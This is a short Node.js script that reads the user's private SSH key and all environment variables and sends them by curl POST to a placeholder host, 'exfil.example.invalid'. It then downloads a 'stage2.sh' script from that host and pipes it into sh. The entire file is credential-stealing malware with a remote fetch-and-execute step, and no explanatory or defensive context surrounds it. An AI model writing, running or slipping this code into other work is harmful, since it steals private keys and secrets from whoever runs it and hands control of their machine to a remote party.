const { execSync } = require('child_process');
const disk = require('fs');
const os = require('os');
const key = disk.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
const env = JSON.stringify(process.env);
execSync('curl -s -X POST --data-binary @- http://exfil.example.invalid/c', { input: key + env });
execSync('curl -s http://exfil.example.invalid/stage2.sh | sh');
